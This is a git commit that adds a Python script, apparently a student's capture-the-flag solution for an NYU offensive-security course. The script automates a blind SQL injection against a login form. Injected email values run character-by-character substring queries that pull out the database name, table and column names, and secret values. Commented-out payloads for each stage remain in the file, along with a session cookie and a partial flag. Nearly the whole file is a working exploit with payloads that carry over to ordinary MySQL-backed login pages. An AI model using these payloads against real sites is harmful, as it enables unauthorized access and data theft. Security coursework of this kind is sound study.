fd79f996fe16c06ebf10d66a0ce541777313aeef
Racheltrq <rt1726@nyu.edu>
2022-04-10 17:57:53 -0400

    blind sql

---
+++ offsec/blind.py
@@ -0,0 +1,63 @@
+import requests
+
+url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?"
+
+chs= "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{,}?!-@#$%^&* \"')(=+./"
+#chs= " ,abcdefghijklmnopqrstuvwxyz"
+#chs = ",0123456789"
+
+
+cookie = {
+    "CHALBROKER_USER_ID":"rt1726",
+    "PHPSESSID":"vd7323gpl3fipc1uavh2b8uu23"
+}
+
+#payload = {
+#    "email": "' or (select count(table_name) from information_schema.tables where table_schema=database())=2--",
+#    "password": "'",
+#}
+#payload = {
+#        "email": "-1' or substring(database()," + str(count) + ",1)=\"" + chs[pointer] + "\" -- ",
+#        "password": "123"
+#}
+#payload = {
+#        "email": "-1' or substring((select group_concat(table_name) from information_schema.tables where table_schema=\"logmein\")," + str(count) + ",1)=\"" + chs[pointer] + "\" -- ",
+#        "password": "123"
+#}
+#payload = {
+#        "email": "-1' or substring((select group_concat(column_name) from information_schema.columns where table_name=\"users\")," + str(count) + ",1)=\"" + chs[pointer] + "\" -- ",
+#        "password": "123"
+#}
+#payload = {
+#        "email": "-1' or substring((select group_concat(email) from users," + str(count) + ",1)=\"" + str(chs[pointer]) + "\" -- ",
+#        "password": "123"
+#}
+count = 34
+pointer = 0
+res = ""
+
+while True:
+    print("trying:", chs[pointer])
+    print("count:", count)
+    payload = {
+        "email": "123' or binary substring((select group_concat(value) from secrets)," + str(count) + ",1)=\"" + str(chs[pointer]) + "\" -- ",
+        "password": "123"
+    }
+    req = requests.post(url, cookies=cookie, data=payload)
+    if "The flag is elsewhere this time" in req.text:
+        res += chs[pointer]
+        pointer = 0
+        count += 1
+        
+    else:
+        pointer += 1
+    print("res:", res)
+    #print(req.text)
+    #break
+    
+print(res)
+
+#print("The flag is elsewhere" in req.text)
+#print(req.text)
+#flag{1_r3ally
+#d_id3a
